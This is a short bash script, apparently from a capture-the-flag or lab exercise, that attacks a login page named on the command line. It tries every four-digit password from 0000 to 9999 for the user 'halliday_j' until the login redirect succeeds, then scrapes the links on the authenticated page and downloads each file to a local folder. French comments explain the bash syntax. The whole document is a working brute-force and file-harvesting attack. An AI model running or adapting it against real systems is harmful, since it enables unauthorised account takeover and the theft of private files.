#!/bin/bash

##########################
# DDL all files from arg1
##########################

varLink="http://$1/login.php"
password=0
for i in $(seq -f "%04g" 0 9999)
do
    http_code=$(curl -Ls -w  '%{url_effective}' --data "login=halliday_j&password="$i"" $varLink)
    url=$(echo "$http_code" | tail -1 )
    if [ "$url" != "$varLink" ]
    then
	password=$i
	break
    fi
    
done

allFile=$(curl -Ls  --data "login=halliday_j&password="$password""  $varLink )

enlevAll=$(echo "$allFile" | grep -o '<a href=[^>]*')
enlevAHREF=$(echo "$enlevAll" | grep -o '"[^"]*' )
result=$(echo "$enlevAHREF" | grep -o '[^"]*' )

enlevSLASH=$(echo "${result#*/}")
max=${#enlevSLASH}
result="${enlevSLASH:1:max}"

# sed filt et trans str
# s/regex/rempl ; $ last line
# delete d '\n'
str=$(echo "$result" | sed 's/$/\\n/'| tr -d '\n' )

# [[]] test etendue
# %% longest match pattern
# *x* contain x
while [[ $str ]]; do
    if [[ $str = *'\n'* ]]; then
	first=${str%%'\n'*}
	rest=${str#*'\n'}
    else                    
	first=$str          
	rest=''             
    fi
   curl -s "http://$1/files/"$first > ../out/www/$first #MySplited
   str=$rest
done
